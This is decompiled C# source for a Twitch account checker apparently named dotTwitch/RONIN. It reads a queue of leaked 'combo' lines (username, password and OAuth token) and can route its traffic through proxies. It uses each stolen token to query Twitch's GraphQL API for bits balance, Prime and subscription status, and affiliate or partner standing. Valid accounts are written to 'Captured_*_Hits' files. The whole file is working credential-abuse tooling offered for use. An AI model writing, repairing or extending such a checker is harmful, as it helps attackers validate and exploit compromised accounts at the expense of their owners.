using System;
using System.Drawing;
using System.Text.RegularExpressions;
using System.Threading;
using Leaf.xNet;
using RONIN.Core.BackEnd.SlavLib;
using RONIN.Core.BackEnd.Variables;

namespace dotTwitch.Core.Modules
{
	// Token: 0x02000014 RID: 20
	internal class Checker
	{
		// Token: 0x0600005F RID: 95 RVA: 0x00007850 File Offset: 0x00005A50
		public static void DoWork()
		{
			for (;;)
			{
				SlavCore.UpdateTitle(null, 0, null, 0);
				if (Var.comboQueue.Count != 0)
				{
					try
					{
						string text = Var.comboQueue.Take();
						for (;;)
						{
							try
							{
								if (text.Contains(":") || text.Contains(";") || text.Contains("|"))
								{
									string[] array = text.Split(new char[]
									{
										':',
										';',
										'|'
									});
									string text2 = array[0];
									string str = array[2];
									string str2 = text2;
									if (text2.Contains("@"))
									{
										str2 = text2.Split(new char[]
										{
											'@'
										})[0];
									}
									HttpRequest httpRequest = new HttpRequest();
									try
									{
										try
										{
											httpRequest.IgnoreProtocolErrors = true;
											httpRequest.KeepAlive = true;
											if (Var.proxies.Count != 0)
											{
												httpRequest.Proxy = SlavCore.LoadProxyType();
											}
											httpRequest.AddHeader("Authorization", "OAuth " + str);
											string str3 = "[{\"operationName\":\"PrimeSubscribe_UserPrimeData\",\"variables\":{\"login\":\"" + str2 + "\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"58c25a2b0ccbde33498f3a5cf6027ff32168febd8a63b749f184028e8ab9192a\"}}}]";
											string text3 = httpRequest.Post("https://gql.twitch.tv/gql", str3, "text/plain;charset=UTF-8").ToString();
											string value = Regex.Match(text3, "canPrimeSubscribe\":(.*?),\"primeSubCreditBenefit").Groups[1].Value;
											string value2 = Regex.Match(text3, "\"hasPrime\":(.*?),").Groups[1].Value;
											string str4 = "[{\"operationName\":\"BitsCard_Bits\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fe1052e19ce99f10b5bd9ab63c5de15405ce87a1644527498f0fc1aadeff89f2\"}}},{\"operationName\":\"BitsCard_MainCard\",\"variables\":{\"name\":\"214062798\",\"withCheerBombEventEnabled\":false},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"88cb043070400a165104f9ce491f02f26c0b571a23b1abc03ef54025f6437848\"}}}]";
											httpRequest.AddHeader("Authorization", "OAuth " + str);
											string value3 = Regex.Match(httpRequest.Post("https://gql.twitch.tv/gql", str4, "text/plain;charset=UTF-8").ToString(), "bitsBalance\":(.*?),\"login").Groups[1].Value;
											string str5 = "[{\"operationName\":\"DashboardRevenueSettingsRoot\",\"variables\":{\"channelName\":\"" + text2 + "\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ee3da8608d77bd584f26584ce5287eb41ec381855ffb416fce5ced0d5ea581ca\"}}}]";
											httpRequest.AddHeader("Authorization", "OAuth " + str);
											httpRequest.AddHeader("X-Device-Id", "90b625963ee28536");
											httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
											string input = httpRequest.Post("https://gql.twitch.tv/gql", str5, "text/plain;charset=UTF-8").ToString();
											string value4 = Regex.Match(input, "\"isAffiliate\":(.*?),\"").Groups[1].Value;
											string value5 = Regex.Match(input, "\"isPartner\":(.*?),\"").Groups[1].Value;
											if (!text3.Contains("token is invalid."))
											{
												if (!value3.Equals("0") || !value3.Equals("null") || !value3.Equals(null))
												{
													Checker.bCnt = Convert.ToInt32(value3);
													if (Checker.bCnt > 0)
													{
														Checker.bit = true;
														Console.WriteLine(string.Format("{0} | Bits: {1} - {2}", text, Checker.bit, value3), Color.Green);
														SlavCore.SaveData(string.Format("{0} | Bits: {1} - {2}", text, Checker.bit, value3), "Captured_Bit_Hits", null, true);
													}
												}
												if (value4.Equals("true"))
												{
													Checker.aff = true;
													Console.WriteLine(string.Format("{0} | Affiliate: {1}", text, Checker.aff), Color.Green);
													SlavCore.SaveData(string.Format("{0} | Affiliate: {1} | Bits: {2} - {3}", new object[]
													{
														text,
														Checker.aff,
														Checker.bit,
														value3
													}), "Captured_Affiliate_Hits", null, true);
												}
												if (value5.Equals("true"))
												{
													Checker.part = true;
													Console.WriteLine(string.Format("{0} | Partner: {1}", text, Checker.part), Color.Green);
													SlavCore.SaveData(string.Format("{0} | Partner: {1} | Bits: {2} - {3}", new object[]
													{
														text,
														Checker.part,
														Checker.bit,
														value3
													}), "Captured_Partner_Hits", null, true);
												}
												if (value2.Equals("true"))
												{
													if (value.Equals("true"))
													{
														Checker.sub = true;
														Console.WriteLine(string.Format("{0} | Can Sub: {1} | Affiliate: {2} | Partner: {3} | Bits: {4} - {5}", new object[]
														{
															text,
															Checker.sub,
															Checker.aff,
															Checker.part,
															Checker.bit,
															value3
														}), Color.Green);
														SlavCore.SaveData(string.Format("{0} | Can Sub: {1} | Affiliate: {2} | Partner: {3} | Bits: {4} - {5}", new object[]
														{
															text,
															Checker.sub,
															Checker.aff,
															Checker.part,
															Checker.bit,
															value3
														}), "Captured_Sub_Hits", null, true);
														SlavCore.Valid();
													}
													else
													{
														string value6 = Regex.Match(text3, "\"renewalDate\":\"(.*?)T").Groups[1].Value;
														Checker.renewing = true;
														Console.WriteLine(string.Format("{0} | Can Sub: {1} | Renewing: {2} - {3} | Affiliate: {4} | Partner: {5} | Bits: {6} - {7}", new object[]
														{
															text,
															Checker.sub,
															Checker.renewing,
															value6,
															Checker.aff,
															Checker.part,
															Checker.bit,
															value3
														}), Color.Green);
														SlavCore.SaveData(string.Format("{0} | Can Sub: {1} | Renewing: {2} - {3} | Affiliate: {4} | Partner: {5} | Bits: {6} - {7}", new object[]
														{
															text,
															Checker.sub,
															Checker.renewing,
															value6,
															Checker.aff,
															Checker.part,
															Checker.bit,
															value3
														}), "Captured_Renewing" + value6 + "_Hits", null, true);
														SlavCore.Valid();
													}
												}
												else if (!Checker.bit && !Checker.aff && !Checker.part && !Checker.sub && !Checker.renewing)
												{
													Interlocked.Increment(ref Checker.free);
													SlavCore.SaveData(text ?? "", "Captured_Plain_Hits", null, true);
													SlavCore.Custom();
												}
												else if (text3.Contains("token is invalid."))
												{
													SlavCore.Invalid();
												}
											}
										}
										catch (HttpException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (NullReferenceException)
										{
											SlavCore.Retry();
											continue;
										}
										catch (Exception ex)
										{
											Console.WriteLine(ex.ToString());
											SlavCore.Error();
											continue;
										}
										break;
									}
									finally
									{
										httpRequest.Dispose();
									}
								}
								SlavCore.Invalid();
							}
							catch (Exception ex2)
							{
								Console.WriteLine(ex2.ToString());
								SlavCore.Error();
								continue;
							}
							break;
						}
						continue;
					}
					catch (Exception ex3)
					{
						Console.WriteLine(ex3.ToString());
						continue;
					}
					break;
				}
				break;
			}
			Var.threads--;
		}

		// Token: 0x0400003F RID: 63
		public static int bCnt;

		// Token: 0x04000040 RID: 64
		public static int free;

		// Token: 0x04000041 RID: 65
		public static bool aff;

		// Token: 0x04000042 RID: 66
		public static bool part;

		// Token: 0x04000043 RID: 67
		public static bool bit;

		// Token: 0x04000044 RID: 68
		public static bool sub;

		// Token: 0x04000045 RID: 69
		public static bool renewing;
	}
}
